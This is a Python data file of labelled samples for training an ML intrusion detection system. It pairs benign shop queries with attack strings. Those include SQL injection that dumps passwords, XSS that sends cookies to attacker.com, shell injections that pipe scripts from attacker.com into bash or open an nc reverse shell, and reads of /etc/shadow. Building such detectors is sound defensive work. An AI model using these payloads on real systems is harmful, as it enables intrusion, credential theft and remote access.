"""Comprehensive dataset and attack signatures for Aegis ML IDPS."""

TRAINING_DATA = [
    # ==========================================
    # 1. BENIGN SAMPLES (Normal customer & web inputs)
    # ==========================================
    ("order status for my recent purchase please", "Benign"),
    ("hello world this is a normal review", "Benign"),
    ("searching for wireless headphones under 50 dollars", "Benign"),
    ("great product, fast shipping, would buy again", "Benign"),
    ("how do I reset my account password", "Benign"),
    ("Can I get this delivered by tomorrow morning?", "Benign"),
    ("The battery life is amazing, lasted for 3 days straight.", "Benign"),
    ("Looking for high quality running shoes size 10", "Benign"),
    ("Please update my shipping address to 123 Maple Street", "Benign"),
    ("What are your business hours on weekends?", "Benign"),
    ("I love the sleek design and intuitive user interface.", "Benign"),
    ("Is there any discount code for first time buyers?", "Benign"),
    ("Track package with tracking number TRK987654321", "Benign"),
    ("The camera resolution is crisp and clear in daylight.", "Benign"),
    ("Thank you for the quick customer support response!", "Benign"),
    ("Can I change the color of the jacket to Navy Blue?", "Benign"),
    ("Is this item compatible with Mac OS and Windows 11?", "Benign"),
    ("Looking for a comfortable ergonomic office chair", "Benign"),
    ("Please cancel my subscription after the current billing cycle", "Benign"),
    ("Refund received promptly, excellent service overall.", "Benign"),
    ("Stainless steel water bottle with leak proof lid", "Benign"),
    ("How many lumens is this flashlight?", "Benign"),
    ("My cart total seems incorrect after adding the coupon", "Benign"),
    ("Can you notify me when this size is back in stock?", "Benign"),
    ("High quality organic cotton t-shirt in green", "Benign"),
    ("Where can I find the user manual in PDF format?", "Benign"),
    ("Payment completed via credit card successfully", "Benign"),
    ("What is the warranty period for this electrical appliance?", "Benign"),
    ("Please email the invoice to accounting@example.com", "Benign"),
    ("Smooth checkout experience, 5 stars rating!", "Benign"),

    # ==========================================
    # 2. SQL INJECTION (SQLi)
    # ==========================================
    ("' OR '1'='1' --", "SQL Injection"),
    ("admin'--", "SQL Injection"),
    ("admin' /*", "SQL Injection"),
    ("' OR 1=1 --", "SQL Injection"),
    ("' OR 'a'='a", "SQL Injection"),
    ("union select username, password from users--", "SQL Injection"),
    ("' UNION SELECT null, username, password FROM accounts --", "SQL Injection"),
    ("' OR 1=1 DROP TABLE users; --", "SQL Injection"),
    ("1' AND SLEEP(5)--", "SQL Injection"),
    ("1' WAITFOR DELAY '0:0:5'--", "SQL Injection"),
    ("1; EXEC xp_cmdshell('net user')--", "SQL Injection"),
    ("' UNION ALL SELECT NULL, NULL, version(), user() --", "SQL Injection"),
    ("1 AND 1=1 UNION SELECT schema_name FROM information_schema.schemata--", "SQL Injection"),
    ("admin' OR '1'='1' /*", "SQL Injection"),
    ("' HAVING 1=1 --", "SQL Injection"),
    ("' GROUP BY column_name HAVING 1=1 --", "SQL Injection"),
    ("1' ORDER BY 1,2,3,4,5--", "SQL Injection"),
    ("' UNION SELECT 1, @@version, 3, 4--", "SQL Injection"),
    ("1 OR 1=1; SELECT * FROM credentials", "SQL Injection"),
    ("') OR ('1'='1", "SQL Injection"),
    ("' OR '' = '", "SQL Injection"),
    ("1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--", "SQL Injection"),
    ("benchmark(50000000,MD5(1))", "SQL Injection"),
    ("'; UPDATE users SET role='admin' WHERE id=1;--", "SQL Injection"),
    ("1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64--", "SQL Injection"),

    # ==========================================
    # 3. CROSS-SITE SCRIPTING (XSS)
    # ==========================================
    ("<script>alert(1)</script>", "XSS"),
    ("<script>alert('XSS')</script>", "XSS"),
    ("<img src=x onerror=alert(1)>", "XSS"),
    ("<img src=invalid onerror=alert(document.domain)>", "XSS"),
    ("javascript:alert(document.cookie)", "XSS"),
    ("<svg onload=alert('xss')>", "XSS"),
    ("<svg/onload=alert`1`>", "XSS"),
    ("<body onload=alert('Pwned')>", "XSS"),
    ("<iframe src=\"javascript:alert('XSS')\">", "XSS"),
    ("<input type=\"text\" autofocus onfocus=\"alert(1)\">", "XSS"),
    ("<a href=\"javascript:alert(document.location)\">Click here</a>", "XSS"),
    ("<details open ontoggle=alert(1)>", "XSS"),
    ("<video><source onerror=\"javascript:alert(1)\">", "XSS"),
    ("<marquee onstart=alert('xss')>", "XSS"),
    ("'\"><script src=http://evil.com/xss.js></script>", "XSS"),
    ("<div style=\"background-image: url(javascript:alert('XSS'))\">", "XSS"),
    ("<object data=\"javascript:alert(1)\">", "XSS"),
    ("<embed src=\"javascript:alert(1)\">", "XSS"),
    ("<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>", "XSS"),
    ("<table background=\"javascript:alert(1)\">", "XSS"),
    ("<isindex type=image src=1 onerror=alert(1)>", "XSS"),
    ("<audio src/onerror=alert(1)>", "XSS"),
    ("</script><script>fetch('http://attacker.com/steal?c='+document.cookie)</script>", "XSS"),
    ("<script>window.location='http://attacker.com/?cookie='+document.cookie</script>", "XSS"),

    # ==========================================
    # 4. COMMAND INJECTION & PATH TRAVERSAL
    # ==========================================
    ("; cat /etc/passwd", "Command Injection"),
    ("| whoami", "Command Injection"),
    ("&& id", "Command Injection"),
    ("`cat /etc/shadow`", "Command Injection"),
    ("$(curl -s http://attacker.com/evil.sh | bash)", "Command Injection"),
    ("127.0.0.1; nc -e /bin/sh attacker.com 4444", "Command Injection"),
    ("|| powershell -Command Invoke-WebRequest http://evil.com/payload.exe", "Command Injection"),
    ("& ping -c 4 127.0.0.1 &", "Command Injection"),
    ("../../../../../etc/passwd", "Command Injection"),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Command Injection"),
    ("/var/log/../../etc/shadow", "Command Injection"),

    # ==========================================
    # 5. BRUTE FORCE & CREDENTIAL ATTACKS
    # ==========================================
    ("hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh brute force", "Brute Force"),
    ("repeated failed password attempt user=admin count=50", "Brute Force"),
    ("medusa -h 10.77.0.1 -u root -P passwords.txt -M http", "Brute Force"),
    ("wfuzz -c -z file,users.txt -z file,passwords.txt http://target/login", "Brute Force"),
    ("ffuf -w wordlist.txt -u http://target/FUZZ -mc 200", "Brute Force"),
    ("credential stuffing automated spray attack", "Brute Force"),
    ("password guessing dictionary attack on /api/auth/login", "Brute Force"),

    # ==========================================
    # 6. PORT SCAN & RECONNAISSANCE
    # ==========================================
    ("nmap -sS -sV -p- 10.77.0.1 syn port scan", "Port Scan"),
    ("masscan -p1-65535 10.77.0.0/24 --rate=10000", "Port Scan"),
    ("zmap -p 80 10.77.0.0/24 port sweep", "Port Scan"),
    ("nmap -sT -A -T4 10.77.0.5 comprehensive scan", "Port Scan"),
    ("nmap -sU -p 53,161,500 udp sweep", "Port Scan"),
    ("rustscan -a 10.77.0.1 -- -A -sC fast port discovery", "Port Scan"),
    ("reconnaissance SYN probe across all privileged ports", "Port Scan"),

    # ==========================================
    # 7. DOS & FLOOD ATTACKS
    # ==========================================
    ("hping3 --flood -S -p 80 10.77.0.1 syn flood attack", "DoS Flood"),
    ("slowloris -p 80 -t 500 http connection exhaustion", "DoS Flood"),
    ("LOIC TCP/UDP flood traffic spike", "DoS Flood"),
    ("UDP packet amplification storm reflection attack", "DoS Flood"),
    ("ICMP ping flood saturation bandwidth exhaustion", "DoS Flood"),
    ("HTTP POST slow body denial of service", "DoS Flood"),
    ("TLS handshake exhaustion flood loop", "DoS Flood"),
]
